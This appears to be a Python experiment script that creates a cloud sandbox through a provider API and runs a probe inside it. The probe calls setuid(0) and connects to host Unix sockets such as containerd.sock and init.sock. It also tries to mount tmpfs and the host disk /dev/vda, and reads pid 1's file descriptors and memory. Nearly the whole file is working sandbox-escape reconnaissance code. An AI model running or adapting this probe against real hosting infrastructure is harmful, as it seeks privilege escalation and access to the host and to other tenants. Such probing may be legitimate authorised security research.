# 实验J71: 宿主 socket 可连接性 (cell.sock/containerd.sock/apm/metrics) + setuid(0) 后 mount 验证
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj71"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, sys, socket, struct, ctypes

os.setuid(0); os.setgid(0)
print("== [0] uid=%d gid=%d ==" % (os.getuid(), os.getgid()), flush=True)

print("== [1] /run 下关键目录与 socket 文件 ==", flush=True)
for d in ["/run/vercel/share", "/run/cell", "/run/containerd", "/run/apm", "/run/metrics"]:
    try:
        print("--- %s ---" % d, flush=True)
        for f in sorted(os.listdir(d)):
            try:
                st = os.stat(os.path.join(d, f))
                print("  %s mode=%o size=%d" % (f, st.st_mode, st.st_size), flush=True)
            except Exception as e:
                print("  %s ERR %r" % (f, e), flush=True)
    except Exception as e:
        print("%s ERR %r" % (d, e), flush=True)

print("== [2] unix socket 连接测试 ==", flush=True)
targets = ["/run/vercel/share/init.sock", "/run/cell/cell.sock",
           "/run/containerd/containerd.sock", "/run/containerd/containerd.sock.ttrpc",
           "/run/apm/apm.sock", "/run/metrics/metrics.sock"]
for t in targets:
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(t)
        print("[%-45s] CONNECT OK" % t, flush=True)
        try:
            s.sendall(b"GET / HTTP/1.0\r\n\r\n")
            data = s.recv(200)
            print("    resp: %r" % data[:100], flush=True)
        except Exception as e:
            print("    send/recv ERR %r" % e, flush=True)
        s.close()
    except Exception as e:
        print("[%-45s] CONNECT FAIL %r" % (t, e), flush=True)

print("== [3] mount 测试 (uid0) ==", flush=True)
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()
os.makedirs("/tmp/mt3", exist_ok=True)
r, e = sc(165, b"none", b"/tmp/mt3", b"tmpfs", 0, None)
print("mount tmpfs: rc=%d errno=%d" % (r, e), flush=True)
if r == 0:
    print("  -> MOUNTED! write test:", flush=True)
    try:
        open("/tmp/mt3/x", "w").write("hello")
        print("  write OK, umount:", flush=True)
        print("  ", sc(166, b"/tmp/mt3", 0), flush=True)
    except Exception as ex:
        print("  write ERR %r" % ex, flush=True)
# mount /dev/vda (只读尝试)
os.makedirs("/tmp/vdam", exist_ok=True)
r, e = sc(165, b"/dev/vda", b"/tmp/vdam", b"xfs", 0x1, None)  # MS_RDONLY=1
print("mount vda ro: rc=%d errno=%d" % (r, e), flush=True)
if r == 0:
    print("  -> VDA MOUNTED!", flush=True)
    print("  ", sorted(os.listdir("/tmp/vdam"))[:20], flush=True)
    print("  umount:", sc(166, b"/tmp/vdam", 0), flush=True)

print("== [4] fd 4/7/8 是什么 (对照 unix 表) ==", flush=True)
for fd in [4, 7, 8, 16]:
    try:
        info = os.readlink("/proc/1/fd/%d" % fd)
        print("fd %d -> %s" % (fd, info), flush=True)
    except Exception as e:
        print("fd %d ERR %r" % (fd, e), flush=True)

print("== [5] process_vm_readv 简化读 pid1 头部 ==", flush=True)
try:
    f = open("/proc/1/mem", "rb", buffering=0)
    f.seek(0x400000)
    print("p1mem[0x400000:]:", f.read(16).hex(), flush=True)
    f.close()
except Exception as e:
    print("p1mem ERR %r" % e, flush=True)

print("== [6] 宿主进程可见性 (ps) ==", flush=True)
try:
    import subprocess
    r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
    lines = r.stdout.splitlines()
    print("ps lines: %d" % len(lines), flush=True)
    for l in lines[:15]:
        print(" ", l[:150], flush=True)
except Exception as e:
    print("ps ERR %r" % e, flush=True)
"""
run_cmd(sid, PROBE, "host-socket-mount", wait=True, timeout=240000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
